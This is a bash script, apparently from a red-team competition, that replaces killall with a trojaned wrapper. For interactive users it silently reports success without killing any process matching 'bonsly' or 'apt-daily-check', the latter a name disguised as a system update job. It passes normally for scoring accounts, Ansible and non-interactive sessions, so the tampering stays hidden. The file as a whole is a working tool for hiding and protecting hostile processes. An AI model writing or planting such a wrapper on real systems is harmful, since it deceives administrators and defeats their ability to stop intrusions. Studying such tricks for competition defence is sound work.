#!/bin/bash
REAL_KILLALL="/usr/bin/killall"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_KILLALL "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_KILLALL "$@"
fi

# Script/non-interactive bypass — don't break automated pipelines
if [ ! -t 0 ] && [ ! -t 1 ]; then
    exec $REAL_KILLALL "$@"
fi

BLOCKED_PATTERNS=("bonsly" "apt-daily-check")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 0
        fi
    done
done

exec $REAL_KILLALL "$@"
